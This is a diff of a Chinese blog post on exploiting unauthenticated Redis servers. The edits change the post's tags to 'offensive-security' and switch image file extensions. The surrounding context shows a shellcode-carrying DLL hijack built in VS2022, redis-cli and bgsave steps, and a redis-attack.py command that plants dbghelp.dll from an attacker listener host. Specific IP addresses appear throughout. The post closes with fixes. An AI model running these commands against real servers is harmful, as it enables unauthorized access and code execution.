@@ -6,9 +6,8 @@ date: "2025-09-22T20:24:20+08:00"
 lastmod: "2025-09-22T20:24:20+08:00"
 image: ""
 license: ""
-categories: ["talk"]
-tags: ["redis"]
-
+categories: ["offensive-security"]
+tags: ["Redis"]
 ---
 redis未授权利用，确认其是否存活
 
@@ -251,9 +250,9 @@ VS2019 ： https://github.com/kiwings/DLLHijacker
 
 VS2022本来之前使用的先知文章的作者的项目，但是不知道为什么他下线了，喜欢藏是吧，幸好我存了，但是我懒得发GitHub，阿B就发了，里面也有完整的DLL和如何使用VS2022去替换shellcode之后处理的过程，先生成shellcode
 
-![img](./assets/001.webp)
+![img](./assets/001.png)
 
-![img](./assets/002.webp)
+![img](./assets/002.png)
 
 打开项目属性，
 
@@ -277,9 +276,9 @@ VS2022本来之前使用的先知文章的作者的项目，但是不知道为�
 - 找到 “生成清单”（Generate Manifest）选项。
 - 设置为 “否 (/MANIFEST:NO)”。
 
-![img](./assets/003.webp)
+![img](./assets/003.png)
 
-![img](./assets/004.webp)
+![img](./assets/004.png)
 
 应用，编译成dll文件即可
 
@@ -298,7 +297,7 @@ redis-cli -h 39.99.240.173
 bgsave
 ```
 
-![img](./assets/005.webp)
+![img](./assets/005.png)
 
 或者是用RabR，我感觉这个更方便，可以直接上线
 
@@ -308,9 +307,9 @@ python3 redis-attack.py -r 39.99.231.97 -L 47.109.176.117 -wf dbghelp.dll
 h
 ```
 
-![img](./assets/006.webp)
+![img](./assets/006.png)
 
-![img](./assets/007.webp)
+![img](./assets/007.png)
 
 修复，升级版本，禁用bgsave，以及权限控制
 
